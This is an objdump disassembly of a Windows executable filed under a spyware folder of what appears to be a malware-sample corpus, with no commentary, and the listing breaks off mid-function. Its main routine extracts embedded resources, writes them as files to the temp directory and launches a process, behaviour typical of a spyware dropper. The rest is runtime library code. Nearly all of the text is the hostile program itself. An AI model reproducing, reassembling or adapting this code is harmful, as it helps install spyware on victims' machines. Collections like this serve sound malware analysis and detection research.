
malware_samples/spyware/3c417b21e9b263fd8a81e74f14284248f1401fb290914d664bb4123fbd8d829b.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	81 ec b4 0c 00 00    	sub    $0xcb4,%esp
  401006:	8d 04 24             	lea    (%esp),%eax
  401009:	c7 04 24 0c 00 00 00 	movl   $0xc,(%esp)
  401010:	c7 44 24 08 00 00 00 	movl   $0x0,0x8(%esp)
  401017:	00 
  401018:	85 c0                	test   %eax,%eax
  40101a:	74 13                	je     0x40102f
  40101c:	6a 00                	push   $0x0
  40101e:	8d 4c 24 08          	lea    0x8(%esp),%ecx
  401022:	51                   	push   %ecx
  401023:	6a 01                	push   $0x1
  401025:	68 f4 b4 40 00       	push   $0x40b4f4
  40102a:	e8 f1 03 00 00       	call   0x401420
  40102f:	68 04 01 00 00       	push   $0x104
  401034:	8d 94 24 88 04 00 00 	lea    0x488(%esp),%edx
  40103b:	52                   	push   %edx
  40103c:	6a 00                	push   $0x0
  40103e:	ff 15 08 a0 40 00    	call   *0x40a008
  401044:	33 c0                	xor    %eax,%eax
  401046:	eb 08                	jmp    0x401050
  401048:	8d a4 24 00 00 00 00 	lea    0x0(%esp),%esp
  40104f:	90                   	nop
  401050:	8a 8c 04 84 04 00 00 	mov    0x484(%esp,%eax,1),%cl
  401057:	88 8c 04 80 03 00 00 	mov    %cl,0x380(%esp,%eax,1)
  40105e:	40                   	inc    %eax
  40105f:	84 c9                	test   %cl,%cl
  401061:	75 ed                	jne    0x401050
  401063:	53                   	push   %ebx
  401064:	56                   	push   %esi
  401065:	57                   	push   %edi
  401066:	8d 84 24 8c 03 00 00 	lea    0x38c(%esp),%eax
  40106d:	50                   	push   %eax
  40106e:	ff 15 4c a1 40 00    	call   *0x40a14c
  401074:	8d 8c 24 8c 03 00 00 	lea    0x38c(%esp),%ecx
  40107b:	51                   	push   %ecx
  40107c:	ff 15 44 a1 40 00    	call   *0x40a144
  401082:	8d 94 24 8c 03 00 00 	lea    0x38c(%esp),%edx
  401089:	52                   	push   %edx
  40108a:	68 b4 b3 40 00       	push   $0x40b3b4
  40108f:	8d 84 24 9c 05 00 00 	lea    0x59c(%esp),%eax
  401096:	68 14 01 00 00       	push   $0x114
  40109b:	50                   	push   %eax
  40109c:	e8 85 03 00 00       	call   0x401426
  4010a1:	83 c4 10             	add    $0x10,%esp
  4010a4:	8d 8c 24 90 04 00 00 	lea    0x490(%esp),%ecx
  4010ab:	51                   	push   %ecx
  4010ac:	ff 15 48 a1 40 00    	call   *0x40a148
  4010b2:	8b 35 10 a0 40 00    	mov    0x40a010,%esi
  4010b8:	6a 0a                	push   $0xa
  4010ba:	68 c4 b3 40 00       	push   $0x40b3c4
  4010bf:	6a 00                	push   $0x0
  4010c1:	ff d6                	call   *%esi
  4010c3:	8b 1d 0c a0 40 00    	mov    0x40a00c,%ebx
  4010c9:	50                   	push   %eax
  4010ca:	ff d3                	call   *%ebx
  4010cc:	6a 0a                	push   $0xa
  4010ce:	68 d4 b3 40 00       	push   $0x40b3d4
  4010d3:	6a 00                	push   $0x0
  4010d5:	8b f8                	mov    %eax,%edi
  4010d7:	ff d6                	call   *%esi
  4010d9:	50                   	push   %eax
  4010da:	ff d3                	call   *%ebx
  4010dc:	8b d8                	mov    %eax,%ebx
  4010de:	85 ff                	test   %edi,%edi
  4010e0:	0f 84 2c 03 00 00    	je     0x401412
  4010e6:	55                   	push   %ebp
  4010e7:	57                   	push   %edi
  4010e8:	6a 00                	push   $0x0
  4010ea:	ff d6                	call   *%esi
  4010ec:	8b 2d 14 a0 40 00    	mov    0x40a014,%ebp
  4010f2:	50                   	push   %eax
  4010f3:	ff d5                	call   *%ebp
  4010f5:	53                   	push   %ebx
  4010f6:	6a 00                	push   $0x0
  4010f8:	89 44 24 24          	mov    %eax,0x24(%esp)
  4010fc:	ff d6                	call   *%esi
  4010fe:	50                   	push   %eax
  4010ff:	ff d5                	call   *%ebp
  401101:	57                   	push   %edi
  401102:	6a 00                	push   $0x0
  401104:	89 44 24 34          	mov    %eax,0x34(%esp)
  401108:	ff d6                	call   *%esi
  40110a:	8b 3d 18 a0 40 00    	mov    0x40a018,%edi
  401110:	50                   	push   %eax
  401111:	ff d7                	call   *%edi
  401113:	53                   	push   %ebx
  401114:	6a 00                	push   $0x0
  401116:	89 44 24 28          	mov    %eax,0x28(%esp)
  40111a:	ff d6                	call   *%esi
  40111c:	50                   	push   %eax
  40111d:	ff d7                	call   *%edi
  40111f:	8d 94 24 8c 02 00 00 	lea    0x28c(%esp),%edx
  401126:	52                   	push   %edx
  401127:	68 04 01 00 00       	push   $0x104
  40112c:	89 44 24 30          	mov    %eax,0x30(%esp)
  401130:	ff 15 1c a0 40 00    	call   *0x40a01c
  401136:	85 c0                	test   %eax,%eax
  401138:	0f 86 bf 02 00 00    	jbe    0x4013fd
  40113e:	8d 84 24 8c 02 00 00 	lea    0x28c(%esp),%eax
  401145:	48                   	dec    %eax
  401146:	8a 48 01             	mov    0x1(%eax),%cl
  401149:	40                   	inc    %eax
  40114a:	84 c9                	test   %cl,%cl
  40114c:	75 f8                	jne    0x401146
  40114e:	8b 0d dc b3 40 00    	mov    0x40b3dc,%ecx
  401154:	8b 15 e0 b3 40 00    	mov    0x40b3e0,%edx
  40115a:	8b 35 20 a0 40 00    	mov    0x40a020,%esi
  401160:	89 08                	mov    %ecx,(%eax)
  401162:	66 8b 0d e4 b3 40 00 	mov    0x40b3e4,%cx
  401169:	89 50 04             	mov    %edx,0x4(%eax)
  40116c:	8a 15 e6 b3 40 00    	mov    0x40b3e6,%dl
  401172:	66 89 48 08          	mov    %cx,0x8(%eax)
  401176:	88 50 0a             	mov    %dl,0xa(%eax)
  401179:	8d 44 24 10          	lea    0x10(%esp),%eax
  40117d:	50                   	push   %eax
  40117e:	8d 8c 24 90 02 00 00 	lea    0x290(%esp),%ecx
  401185:	51                   	push   %ecx
  401186:	ff d6                	call   *%esi
  401188:	8d 94 24 84 00 00 00 	lea    0x84(%esp),%edx
  40118f:	52                   	push   %edx
  401190:	6a 00                	push   $0x0
  401192:	68 e8 b3 40 00       	push   $0x40b3e8
  401197:	8d 84 24 98 02 00 00 	lea    0x298(%esp),%eax
  40119e:	50                   	push   %eax
  40119f:	ff 15 44 a0 40 00    	call   *0x40a044
  4011a5:	85 c0                	test   %eax,%eax
  4011a7:	0f 86 42 02 00 00    	jbe    0x4013ef
  4011ad:	8d 8c 24 84 00 00 00 	lea    0x84(%esp),%ecx
  4011b4:	51                   	push   %ecx
  4011b5:	ff 15 24 a0 40 00    	call   *0x40a024
  4011bb:	8d 54 24 10          	lea    0x10(%esp),%edx
  4011bf:	52                   	push   %edx
  4011c0:	8d 84 24 88 00 00 00 	lea    0x88(%esp),%eax
  4011c7:	50                   	push   %eax
  4011c8:	ff d6                	call   *%esi
  4011ca:	85 c0                	test   %eax,%eax
  4011cc:	0f 84 0f 02 00 00    	je     0x4013e1
  4011d2:	33 c0                	xor    %eax,%eax
  4011d4:	eb 0a                	jmp    0x4011e0
  4011d6:	8d a4 24 00 00 00 00 	lea    0x0(%esp),%esp
  4011dd:	8d 49 00             	lea    0x0(%ecx),%ecx
  4011e0:	8a 8c 04 84 00 00 00 	mov    0x84(%esp,%eax,1),%cl
  4011e7:	88 8c 04 ac 06 00 00 	mov    %cl,0x6ac(%esp,%eax,1)
  4011ee:	40                   	inc    %eax
  4011ef:	84 c9                	test   %cl,%cl
  4011f1:	75 ed                	jne    0x4011e0
  4011f3:	8d bc 24 ac 06 00 00 	lea    0x6ac(%esp),%edi
  4011fa:	4f                   	dec    %edi
  4011fb:	eb 03                	jmp    0x401200
  4011fd:	8d 49 00             	lea    0x0(%ecx),%ecx
  401200:	8a 47 01             	mov    0x1(%edi),%al
  401203:	47                   	inc    %edi
  401204:	84 c0                	test   %al,%al
  401206:	75 f8                	jne    0x401200
  401208:	66 8b 0d ec b3 40 00 	mov    0x40b3ec,%cx
  40120f:	8d 84 24 ac 06 00 00 	lea    0x6ac(%esp),%eax
  401216:	66 89 0f             	mov    %cx,(%edi)
  401219:	48                   	dec    %eax
  40121a:	8d 9b 00 00 00 00    	lea    0x0(%ebx),%ebx
  401220:	8a 48 01             	mov    0x1(%eax),%cl
  401223:	40                   	inc    %eax
  401224:	84 c9                	test   %cl,%cl
  401226:	75 f8                	jne    0x401220
  401228:	8b 15 f0 b3 40 00    	mov    0x40b3f0,%edx
  40122e:	8b 0d f4 b3 40 00    	mov    0x40b3f4,%ecx
  401234:	8b 3d 28 a0 40 00    	mov    0x40a028,%edi
  40123a:	89 10                	mov    %edx,(%eax)
  40123c:	8b 15 f8 b3 40 00    	mov    0x40b3f8,%edx
  401242:	6a 00                	push   $0x0
  401244:	68 80 00 00 00       	push   $0x80
  401249:	89 48 04             	mov    %ecx,0x4(%eax)
  40124c:	8b 0d fc b3 40 00    	mov    0x40b3fc,%ecx
  401252:	89 50 08             	mov    %edx,0x8(%eax)
  401255:	6a 02                	push   $0x2
  401257:	8d 54 24 1c          	lea    0x1c(%esp),%edx
  40125b:	52                   	push   %edx
  40125c:	6a 03                	push   $0x3
  40125e:	89 48 0c             	mov    %ecx,0xc(%eax)
  401261:	68 00 00 00 40       	push   $0x40000000
  401266:	8d 84 24 c4 06 00 00 	lea    0x6c4(%esp),%eax
  40126d:	50                   	push   %eax
  40126e:	ff d7                	call   *%edi
  401270:	8b 1d 2c a0 40 00    	mov    0x40a02c,%ebx
  401276:	8b 2d 30 a0 40 00    	mov    0x40a030,%ebp
  40127c:	8b f0                	mov    %eax,%esi
  40127e:	85 f6                	test   %esi,%esi
  401280:	74 17                	je     0x401299
  401282:	8b 54 24 2c          	mov    0x2c(%esp),%edx
  401286:	8b 44 24 28          	mov    0x28(%esp),%eax
  40128a:	6a 00                	push   $0x0
  40128c:	8d 4c 24 28          	lea    0x28(%esp),%ecx
  401290:	51                   	push   %ecx
  401291:	52                   	push   %edx
  401292:	50                   	push   %eax
  401293:	56                   	push   %esi
  401294:	ff d3                	call   *%ebx
  401296:	56                   	push   %esi
  401297:	ff d5                	call   *%ebp
  401299:	8d 8c 24 94 04 00 00 	lea    0x494(%esp),%ecx
  4012a0:	51                   	push   %ecx
  4012a1:	8d 94 24 88 00 00 00 	lea    0x88(%esp),%edx
  4012a8:	52                   	push   %edx
  4012a9:	68 00 b4 40 00       	push   $0x40b400
  4012ae:	8d 84 24 94 01 00 00 	lea    0x194(%esp),%eax
  4012b5:	68 04 01 00 00       	push   $0x104
  4012ba:	50                   	push   %eax
  4012bb:	e8 66 01 00 00       	call   0x401426
  4012c0:	8d 8c 24 ac 05 00 00 	lea    0x5ac(%esp),%ecx
  4012c7:	51                   	push   %ecx
  4012c8:	8d 94 24 a0 01 00 00 	lea    0x1a0(%esp),%edx
  4012cf:	52                   	push   %edx
  4012d0:	68 08 b4 40 00       	push   $0x40b408
  4012d5:	8d 84 24 cc 0a 00 00 	lea    0xacc(%esp),%eax
  4012dc:	68 18 02 00 00       	push   $0x218
  4012e1:	50                   	push   %eax
  4012e2:	e8 3f 01 00 00       	call   0x401426
  4012e7:	83 c4 28             	add    $0x28,%esp
  4012ea:	6a 00                	push   $0x0
  4012ec:	68 80 00 00 00       	push   $0x80
  4012f1:	6a 02                	push   $0x2
  4012f3:	8d 4c 24 1c          	lea    0x1c(%esp),%ecx
  4012f7:	51                   	push   %ecx
  4012f8:	6a 03                	push   $0x3
  4012fa:	68 00 00 00 40       	push   $0x40000000
  4012ff:	8d 94 24 a0 01 00 00 	lea    0x1a0(%esp),%edx
  401306:	52                   	push   %edx
  401307:	ff d7                	call   *%edi
  401309:	8b f0                	mov    %eax,%esi
  40130b:	85 f6                	test   %esi,%esi
  40130d:	74 17                	je     0x401326
  40130f:	8b 4c 24 1c          	mov    0x1c(%esp),%ecx
  401313:	8b 54 24 20          	mov    0x20(%esp),%edx
  401317:	6a 00                	push   $0x0
  401319:	8d 44 24 28          	lea    0x28(%esp),%eax
  40131d:	50                   	push   %eax
  40131e:	51                   	push   %ecx
  40131f:	52                   	push   %edx
  401320:	56                   	push   %esi
  401321:	ff d3                	call   *%ebx
  401323:	56                   	push   %esi
  401324:	ff d5                	call   *%ebp
  401326:	6a 44                	push   $0x44
  401328:	8d 44 24 44          	lea    0x44(%esp),%eax
  40132c:	6a 00                	push   $0x0
  40132e:	50                   	push   %eax
  40132f:	e8 6c 39 00 00       	call   0x404ca0
  401334:	83 c4 0c             	add    $0xc,%esp
  401337:	33 c0                	xor    %eax,%eax
  401339:	8d 4c 24 30          	lea    0x30(%esp),%ecx
  40133d:	51                   	push   %ecx
  40133e:	8d 54 24 44          	lea    0x44(%esp),%edx
  401342:	52                   	push   %edx
  401343:	89 44 24 38          	mov    %eax,0x38(%esp)
  401347:	89 44 24 3c          	mov    %eax,0x3c(%esp)
  40134b:	89 44 24 40          	mov    %eax,0x40(%esp)
  40134f:	89 44 24 44          	mov    %eax,0x44(%esp)
  401353:	8d 84 24 8c 00 00 00 	lea    0x8c(%esp),%eax
  40135a:	50                   	push   %eax
  40135b:	6a 00                	push   $0x0
  40135d:	6a 00                	push   $0x0
  40135f:	6a 00                	push   $0x0
  401361:	6a 00                	push   $0x0
  401363:	6a 00                	push   $0x0
  401365:	8d 8c 24 cc 0a 00 00 	lea    0xacc(%esp),%ecx
  40136c:	51                   	push   %ecx
  40136d:	8d 94 24 ac 01 00 00 	lea    0x1ac(%esp),%edx
  401374:	52                   	push   %edx
  401375:	c7 44 24 68 44 00 00 	movl   $0x44,0x68(%esp)
  40137c:	00 
  40137d:	ff 15 34 a0 40 00    	call   *0x40a034
  401383:	85 c0                	test   %eax,%eax
  401385:	74 0f                	je     0x401396
  401387:	8b 44 24 30          	mov    0x30(%esp),%eax
  40138b:	6a ff                	push   $0xffffffff
  40138d:	50                   	push   %eax
  40138e:	ff 15 38 a0 40 00    	call   *0x40a038
  401394:	eb 14                	jmp    0x4013aa
  401396:	6a 10                	push   $0x10
  401398:	68 10 b4 40 00       	push   $0x40b410
  40139d:	68 20 b4 40 00       	push   $0x40b420
  4013a2:	6a 00                	push   $0x0
  4013a4:	ff 15 54 a1 40 00    	call   *0x40a154
  4013aa:	8b 35 24 a0 40 00    	mov    0x40a024,%esi
  4013b0:	8d 8c 24 88 01 00 00 	lea    0x188(%esp),%ecx
  4013b7:	51                   	push   %ecx
  4013b8:	ff d6                	call   *%esi
  4013ba:	8d 94 24 ac 06 00 00 	lea    0x6ac(%esp),%edx
  4013c1:	52                   	push   %edx
  4013c2:	ff d6                	call   *%esi
  4013c4:	8d 84 24 84 00 00 00 	lea    0x84(%esp),%eax
  4013cb:	50                   	push   %eax
  4013cc:	ff 15 3c a0 40 00    	call   *0x40a03c
  4013d2:	5d                   	pop    %ebp
  4013d3:	5f                   	pop    %edi
  4013d4:	5e                   	pop    %esi
  4013d5:	33 c0                	xor    %eax,%eax
  4013d7:	5b                   	pop    %ebx
  4013d8:	81 c4 b4 0c 00 00    	add    $0xcb4,%esp
  4013de:	c2 10 00             	ret    $0x10
  4013e1:	6a 10                	push   $0x10
  4013e3:	68 7c b4 40 00       	push   $0x40b47c
  4013e8:	68 8c b4 40 00       	push   $0x40b48c
  4013ed:	eb 1a                	jmp    0x401409
  4013ef:	6a 10                	push   $0x10
  4013f1:	68 7c b4 40 00       	push   $0x40b47c
  4013f6:	68 b0 b4 40 00       	push   $0x40b4b0
  4013fb:	eb 0c                	jmp    0x401409
  4013fd:	6a 10                	push   $0x10
  4013ff:	68 7c b4 40 00       	push   $0x40b47c
  401404:	68 d4 b4 40 00       	push   $0x40b4d4
  401409:	6a 00                	push   $0x0
  40140b:	ff 15 54 a1 40 00    	call   *0x40a154
  401411:	5d                   	pop    %ebp
  401412:	5f                   	pop    %edi
  401413:	5e                   	pop    %esi
  401414:	33 c0                	xor    %eax,%eax
  401416:	5b                   	pop    %ebx
  401417:	81 c4 b4 0c 00 00    	add    $0xcb4,%esp
  40141d:	c2 10 00             	ret    $0x10
  401420:	ff 25 00 a0 40 00    	jmp    *0x40a000
  401426:	8b ff                	mov    %edi,%edi
  401428:	55                   	push   %ebp
  401429:	8b ec                	mov    %esp,%ebp
  40142b:	8d 45 14             	lea    0x14(%ebp),%eax
  40142e:	50                   	push   %eax
  40142f:	6a 00                	push   $0x0
  401431:	ff 75 10             	push   0x10(%ebp)
  401434:	ff 75 0c             	push   0xc(%ebp)
  401437:	ff 75 08             	push   0x8(%ebp)
  40143a:	e8 55 06 00 00       	call   0x401a94
  40143f:	83 c4 14             	add    $0x14,%esp
  401442:	5d                   	pop    %ebp
  401443:	c3                   	ret
  401444:	8b ff                	mov    %edi,%edi
  401446:	55                   	push   %ebp
  401447:	8b ec                	mov    %esp,%ebp
  401449:	83 3d 08 df 40 00 01 	cmpl   $0x1,0x40df08
  401450:	75 05                	jne    0x401457
  401452:	e8 f8 0b 00 00       	call   0x40204f
  401457:	ff 75 08             	push   0x8(%ebp)
  40145a:	e8 45 0a 00 00       	call   0x401ea4
  40145f:	68 ff 00 00 00       	push   $0xff
  401464:	e8 87 07 00 00       	call   0x401bf0
  401469:	59                   	pop    %ecx
  40146a:	59                   	pop    %ecx
  40146b:	5d                   	pop    %ebp
  40146c:	c3                   	ret
  40146d:	6a 58                	push   $0x58
  40146f:	68 70 b5 40 00       	push   $0x40b570
  401474:	e8 a7 1a 00 00       	call   0x402f20
  401479:	33 f6                	xor    %esi,%esi
  40147b:	89 75 fc             	mov    %esi,-0x4(%ebp)
  40147e:	8d 45 98             	lea    -0x68(%ebp),%eax
  401481:	50                   	push   %eax
  401482:	ff 15 50 a0 40 00    	call   *0x40a050
  401488:	6a fe                	push   $0xfffffffe
  40148a:	5f                   	pop    %edi
  40148b:	89 7d fc             	mov    %edi,-0x4(%ebp)
  40148e:	b8 4d 5a 00 00       	mov    $0x5a4d,%eax
  401493:	66 39 05 00 00 40 00 	cmp    %ax,0x400000
  40149a:	75 38                	jne    0x4014d4
  40149c:	a1 3c 00 40 00       	mov    0x40003c,%eax
  4014a1:	81 b8 00 00 40 00 50 	cmpl   $0x4550,0x400000(%eax)
  4014a8:	45 00 00 
  4014ab:	75 27                	jne    0x4014d4
  4014ad:	b9 0b 01 00 00       	mov    $0x10b,%ecx
  4014b2:	66 39 88 18 00 40 00 	cmp    %cx,0x400018(%eax)
  4014b9:	75 19                	jne    0x4014d4
  4014bb:	83 b8 74 00 40 00 0e 	cmpl   $0xe,0x400074(%eax)
  4014c2:	76 10                	jbe    0x4014d4
  4014c4:	33 c9                	xor    %ecx,%ecx
  4014c6:	39 b0 e8 00 40 00    	cmp    %esi,0x4000e8(%eax)
  4014cc:	0f 95 c1             	setne  %cl
  4014cf:	89 4d e4             	mov    %ecx,-0x1c(%ebp)
  4014d2:	eb 03                	jmp    0x4014d7
  4014d4:	89 75 e4             	mov    %esi,-0x1c(%ebp)
  4014d7:	33 db                	xor    %ebx,%ebx
  4014d9:	43                   	inc    %ebx
  4014da:	53                   	push   %ebx
  4014db:	e8 0f 1a 00 00       	call   0x402eef
  4014e0:	59                   	pop    %ecx
  4014e1:	85 c0                	test   %eax,%eax
  4014e3:	75 08                	jne    0x4014ed
  4014e5:	6a 1c                	push   $0x1c
  4014e7:	e8 58 ff ff ff       	call   0x401444
  4014ec:	59                   	pop    %ecx
  4014ed:	e8 70 18 00 00       	call   0x402d62
  4014f2:	85 c0                	test   %eax,%eax
  4014f4:	75 08                	jne    0x4014fe
  4014f6:	6a 10                	push   $0x10
  4014f8:	e8 47 ff ff ff       	call   0x401444
  4014fd:	59                   	pop    %ecx
  4014fe:	e8 03 14 00 00       	call   0x402906
  401503:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  401506:	e8 a7 11 00 00       	call   0x4026b2
  40150b:	85 c0                	test   %eax,%eax
  40150d:	7d 08                	jge    0x401517
  40150f:	6a 1b                	push   $0x1b
  401511:	e8 86 06 00 00       	call   0x401b9c
  401516:	59                   	pop    %ecx
  401517:	ff 15 4c a0 40 00    	call   *0x40a04c
  40151d:	a3 d8 fa 40 00       	mov    %eax,0x40fad8
  401522:	e8 54 10 00 00       	call   0x40257b
  401527:	a3 00 df 40 00       	mov    %eax,0x40df00
  40152c:	e8 8f 0f 00 00       	call   0x4024c0
  401531:	85 c0                	test   %eax,%eax
  401533:	7d 08                	jge    0x40153d
  401535:	6a 08                	push   $0x8
  401537:	e8 60 06 00 00       	call   0x401b9c
  40153c:	59                   	pop    %ecx
  40153d:	e8 06 0d 00 00       	call   0x402248
  401542:	85 c0                	test   %eax,%eax
  401544:	7d 08                	jge    0x40154e
  401546:	6a 09                	push   $0x9
  401548:	e8 4f 06 00 00       	call   0x401b9c
  40154d:	59                   	pop    %ecx
  40154e:	53                   	push   %ebx
  40154f:	e8 07 07 00 00       	call   0x401c5b
  401554:	59                   	pop    %ecx
  401555:	3b c6                	cmp    %esi,%eax
  401557:	74 07                	je     0x401560
  401559:	50                   	push   %eax
  40155a:	e8 3d 06 00 00       	call   0x401b9c
  40155f:	59                   	pop    %ecx
  401560:	e8 84 0c 00 00       	call   0x4021e9
  401565:	84 5d c4             	test   %bl,-0x3c(%ebp)
  401568:	74 06                	je     0x401570
  40156a:	0f b7 4d c8          	movzwl -0x38(%ebp),%ecx
  40156e:	eb 03                	jmp    0x401573
  401570:	6a 0a                	push   $0xa
  401572:	59                   	pop    %ecx
  401573:	51                   	push   %ecx
  401574:	50                   	push   %eax
  401575:	56                   	push   %esi
  401576:	68 00 00 40 00       	push   $0x400000
  40157b:	e8 80 fa ff ff       	call   0x401000
  401580:	89 45 e0             	mov    %eax,-0x20(%ebp)
  401583:	39 75 e4             	cmp    %esi,-0x1c(%ebp)
  401586:	75 06                	jne    0x40158e
  401588:	50                   	push   %eax
  401589:	e8 7e 08 00 00       	call   0x401e0c
  40158e:	e8 a5 08 00 00       	call   0x401e38
  401593:	89 7d fc             	mov    %edi,-0x4(%ebp)
  401596:	eb 35                	jmp    0x4015cd
  401598:	8b 45 ec             	mov    -0x14(%ebp),%eax
  40159b:	8b 08                	mov    (%eax),%ecx
  40159d:	8b 09                	mov    (%ecx),%ecx
  40159f:	89 4d dc             	mov    %ecx,-0x24(%ebp)
  4015a2:	50                   	push   %eax
  4015a3:	51                   	push   %ecx
  4015a4:	e8 e0 0a 00 00       	call   0x402089
  4015a9:	59                   	pop    %ecx
  4015aa:	59                   	pop    %ecx
  4015ab:	c3                   	ret
  4015ac:	8b 65 e8             	mov    -0x18(%ebp),%esp
  4015af:	8b 45 dc             	mov    -0x24(%ebp),%eax
  4015b2:	89 45 e0             	mov    %eax,-0x20(%ebp)
  4015b5:	83 7d e4 00          	cmpl   $0x0,-0x1c(%ebp)
  4015b9:	75 06                	jne    0x4015c1
  4015bb:	50                   	push   %eax
  4015bc:	e8 61 08 00 00       	call   0x401e22
  4015c1:	e8 81 08 00 00       	call   0x401e47
  4015c6:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  4015cd:	8b 45 e0             	mov    -0x20(%ebp),%eax
  4015d0:	eb 13                	jmp    0x4015e5
  4015d2:	33 c0                	xor    %eax,%eax
  4015d4:	40                   	inc    %eax
  4015d5:	c3                   	ret
  4015d6:	8b 65 e8             	mov    -0x18(%ebp),%esp
  4015d9:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  4015e0:	b8 ff 00 00 00       	mov    $0xff,%eax
  4015e5:	e8 7b 19 00 00       	call   0x402f65
  4015ea:	c3                   	ret
  4015eb:	e8 1c 1b 00 00       	call   0x40310c
  4015f0:	e9 78 fe ff ff       	jmp    0x40146d
  4015f5:	8b ff                	mov    %edi,%edi
  4015f7:	55                   	push   %ebp
  4015f8:	8b ec                	mov    %esp,%ebp
  4015fa:	51                   	push   %ecx
  4015fb:	56                   	push   %esi
  4015fc:	8b 75 0c             	mov    0xc(%ebp),%esi
  4015ff:	56                   	push   %esi
  401600:	e8 ac 27 00 00       	call   0x403db1
  401605:	89 45 0c             	mov    %eax,0xc(%ebp)
  401608:	8b 46 0c             	mov    0xc(%esi),%eax
  40160b:	59                   	pop    %ecx
  40160c:	a8 82                	test   $0x82,%al
  40160e:	75 17                	jne    0x401627
  401610:	e8 6a 03 00 00       	call   0x40197f
  401615:	c7 00 09 00 00 00    	movl   $0x9,(%eax)
  40161b:	83 4e 0c 20          	orl    $0x20,0xc(%esi)
  40161f:	83 c8 ff             	or     $0xffffffff,%eax
  401622:	e9 2f 01 00 00       	jmp    0x401756
  401627:	a8 40                	test   $0x40,%al
  401629:	74 0d                	je     0x401638
  40162b:	e8 4f 03 00 00       	call   0x40197f
  401630:	c7 00 22 00 00 00    	movl   $0x22,(%eax)
  401636:	eb e3                	jmp    0x40161b
  401638:	53                   	push   %ebx
  401639:	33 db                	xor    %ebx,%ebx
  40163b:	a8 01                	test   $0x1,%al
  40163d:	74 16                	je     0x401655
  40163f:	89 5e 04             	mov    %ebx,0x4(%esi)
  401642:	a8 10                	test   $0x10,%al
  401644:	0f 84 87 00 00 00    	je     0x4016d1
  40164a:	8b 4e 08             	mov    0x8(%esi),%ecx
  40164d:	83 e0 fe             	and    $0xfffffffe,%eax
  401650:	89 0e                	mov    %ecx,(%esi)
  401652:	89 46 0c             	mov    %eax,0xc(%esi)
  401655:	8b 46 0c             	mov    0xc(%esi),%eax
  401658:	83 e0 ef             	and    $0xffffffef,%eax
  40165b:	83 c8 02             	or     $0x2,%eax
  40165e:	89 46 0c             	mov    %eax,0xc(%esi)
  401661:	89 5e 04             	mov    %ebx,0x4(%esi)
  401664:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  401667:	a9 0c 01 00 00       	test   $0x10c,%eax
  40166c:	75 2c                	jne    0x40169a
  40166e:	e8 89 25 00 00       	call   0x403bfc
  401673:	83 c0 20             	add    $0x20,%eax
  401676:	3b f0                	cmp    %eax,%esi
  401678:	74 0c                	je     0x401686
  40167a:	e8 7d 25 00 00       	call   0x403bfc
  40167f:	83 c0 40             	add    $0x40,%eax
  401682:	3b f0                	cmp    %eax,%esi
  401684:	75 0d                	jne    0x401693
  401686:	ff 75 0c             	push   0xc(%ebp)
  401689:	e8 0a 25 00 00       	call   0x403b98
  40168e:	59                   	pop    %ecx
  40168f:	85 c0                	test   %eax,%eax
  401691:	75 07                	jne    0x40169a
  401693:	56                   	push   %esi
  401694:	e8 b6 24 00 00       	call   0x403b4f
  401699:	59                   	pop    %ecx
  40169a:	f7 46 0c 08 01 00 00 	testl  $0x108,0xc(%esi)
  4016a1:	57                   	push   %edi
  4016a2:	0f 84 80 00 00 00    	je     0x401728
  4016a8:	8b 46 08             	mov    0x8(%esi),%eax
  4016ab:	8b 3e                	mov    (%esi),%edi
  4016ad:	8d 48 01             	lea    0x1(%eax),%ecx
  4016b0:	89 0e                	mov    %ecx,(%esi)
  4016b2:	8b 4e 18             	mov    0x18(%esi),%ecx
  4016b5:	2b f8                	sub    %eax,%edi
  4016b7:	49                   	dec    %ecx
  4016b8:	3b fb                	cmp    %ebx,%edi
  4016ba:	89 4e 04             	mov    %ecx,0x4(%esi)
  4016bd:	7e 1d                	jle    0x4016dc
  4016bf:	57                   	push   %edi
  4016c0:	50                   	push   %eax
  4016c1:	ff 75 0c             	push   0xc(%ebp)
  4016c4:	e8 aa 23 00 00       	call   0x403a73
  4016c9:	83 c4 0c             	add    $0xc,%esp
  4016cc:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4016cf:	eb 4d                	jmp    0x40171e
  4016d1:	83 c8 20             	or     $0x20,%eax
  4016d4:	89 46 0c             	mov    %eax,0xc(%esi)
  4016d7:	83 c8 ff             	or     $0xffffffff,%eax
  4016da:	eb 79                	jmp    0x401755
  4016dc:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  4016df:	83 f9 ff             	cmp    $0xffffffff,%ecx
  4016e2:	74 1b                	je     0x4016ff
  4016e4:	83 f9 fe             	cmp    $0xfffffffe,%ecx
  4016e7:	74 16                	je     0x4016ff
  4016e9:	8b c1                	mov    %ecx,%eax
  4016eb:	83 e0 1f             	and    $0x1f,%eax
  4016ee:	8b d1                	mov    %ecx,%edx
  4016f0:	c1 fa 05             	sar    $0x5,%edx
  4016f3:	c1 e0 06             	shl    $0x6,%eax
  4016f6:	03 04 95 c0 f9 40 00 	add    0x40f9c0(,%edx,4),%eax
  4016fd:	eb 05                	jmp    0x401704
  4016ff:	b8 50 d2 40 00       	mov    $0x40d250,%eax
  401704:	f6 40 04 20          	testb  $0x20,0x4(%eax)
  401708:	74 14                	je     0x40171e
  40170a:	6a 02                	push   $0x2
  40170c:	53                   	push   %ebx
  40170d:	53                   	push   %ebx
  40170e:	51                   	push   %ecx
  40170f:	e8 13 1b 00 00       	call   0x403227
  401714:	23 c2                	and    %edx,%eax
  401716:	83 c4 10             	add    $0x10,%esp
  401719:	83 f8 ff             	cmp    $0xffffffff,%eax
  40171c:	74 25                	je     0x401743
  40171e:	8b 46 08             	mov    0x8(%esi),%eax
  401721:	8a 4d 08             	mov    0x8(%ebp),%cl
  401724:	88 08                	mov    %cl,(%eax)
  401726:	eb 16                	jmp    0x40173e
  401728:	33 ff                	xor    %edi,%edi
  40172a:	47                   	inc    %edi
  40172b:	57                   	push   %edi
  40172c:	8d 45 08             	lea    0x8(%ebp),%eax
  40172f:	50                   	push   %eax
  401730:	ff 75 0c             	push   0xc(%ebp)
  401733:	e8 3b 23 00 00       	call   0x403a73
  401738:	83 c4 0c             	add    $0xc,%esp
  40173b:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40173e:	39 7d fc             	cmp    %edi,-0x4(%ebp)
  401741:	74 09                	je     0x40174c
  401743:	83 4e 0c 20          	orl    $0x20,0xc(%esi)
